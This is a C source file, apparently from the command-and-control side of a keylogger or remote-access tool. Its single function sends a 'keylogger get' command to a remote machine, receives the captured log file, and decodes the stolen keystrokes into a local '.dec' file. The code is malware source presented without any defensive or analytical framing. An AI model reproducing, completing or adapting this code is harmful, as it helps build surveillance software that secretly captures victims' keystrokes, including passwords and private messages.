#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "server/serv_cmds.h"
#include "net/file.h"
#include "net/interface.h"
#include "net/error.h"
#include "logger.h"
#include "types.h"
#include "keylogger.h"

int serv_KEYLOGGER_GET(char* msg)
{
	if(net_SendEmptyCmd(SERV_CMDS_KEYLOGGER_GET) < 1)
	{
		net_PrintLastError();

		return SERV_CMDS_BREAK;
	}

	LOG(LOG_WAR, "May take awhile...\n\n");

	int rv = net_File_Recv(msg, 1);

	int msgLen = strlen(msg) + 5;
	char *outf = malloc(msgLen + sizeof(char));
	memset(outf, 0, msgLen + sizeof(char));
	snprintf(outf, msgLen, "%s.dec", msg);
	net_SetBuffer(NET_BUFFSIZE);
	
	if(!rv)
	{
		net_PrintLastError();
		free(outf);
		free(msg);

		return SERV_CMDS_BREAK;
	}

	LOG_NEWLINE();
	LOG(LOG_WAR, "You may have a problem with unicode characters!\n");
	LOG(LOG_INFO, "Decoding \"%s\" to \"%s\"\n", msg, outf);

	rv = keylogger_DecodeFile(msg, outf);
	free(outf);
	free(msg);

	if(rv)
	{
		LOG(LOG_SUCC, "Done!\n");
	}

	return SERV_CMDS_GOOD;
}